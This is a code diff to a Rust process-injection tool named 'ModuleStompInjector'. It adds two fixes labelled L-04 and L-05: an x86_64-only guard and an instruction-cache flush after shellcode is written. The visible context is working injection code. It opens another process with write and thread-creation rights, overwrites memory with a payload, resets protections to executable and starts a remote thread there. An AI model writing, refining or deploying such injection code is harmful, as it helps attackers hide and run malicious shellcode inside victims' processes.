@@ -23,6 +23,12 @@ impl Injector for ModuleStompInjector {
             };
         }
 
+        // The shellcode stub built below is x86_64 machine code.  Reject the
+        // call at runtime on any other architecture to prevent the CPU from
+        // executing garbage bytes (L-05 fix).
+        #[cfg(not(target_arch = "x86_64"))]
+        return Err(anyhow!("ModuleStompInjector: shellcode stub requires x86_64; unsupported architecture"));
+
         unsafe {
             let h_proc = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ | PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION, 0, pid);
             if h_proc.is_null() { return Err(anyhow!("Failed to open process")); }
@@ -353,6 +359,9 @@ impl Injector for ModuleStompInjector {
             VirtualProtectEx(h_proc, target_addr, payload.len(), PAGE_READWRITE, &mut old_protect);
             WriteProcessMemory(h_proc, target_addr, payload.as_ptr() as _, payload.len(), &mut written);
             VirtualProtectEx(h_proc, target_addr, payload.len(), PAGE_EXECUTE_READ, &mut old_protect);
+            // Flush the instruction cache so the CPU picks up the newly written
+            // shellcode bytes (L-04 fix).
+            winapi::um::processthreadsapi::FlushInstructionCache(h_proc, target_addr, payload.len());
 
             let mut h_exec_thread: *mut winapi::ctypes::c_void = std::ptr::null_mut();
             let exec_status = build_thread(&mut h_exec_thread, 0x1FFFFF, std::ptr::null_mut(), h_proc, target_addr, std::ptr::null_mut(), 0, 0, 0, 0, std::ptr::null_mut());
